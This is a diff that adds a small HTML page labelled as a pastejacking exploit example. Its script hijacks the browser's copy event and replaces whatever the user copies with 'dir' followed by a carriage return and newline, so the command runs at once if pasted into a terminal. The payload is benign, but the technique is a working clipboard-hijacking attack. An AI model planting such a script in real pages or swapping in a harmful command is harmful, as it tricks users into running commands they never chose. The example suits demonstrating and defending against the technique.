@@ -1,0 +1,16 @@
+<html> 
+<head> 
+<title> 
+Pastejacking Exploit 
+</title> 
+</head> 
+<body> 
+This is a pastejacking exploit example. 
+</body> 
+<script> 
+document.addEventListener("copy",function(e){ 
+e.clipboardData.setData("text/plain","dir \r\n"); 
+e.preventDefault(); 
+}) 
+</script> 
+</html>
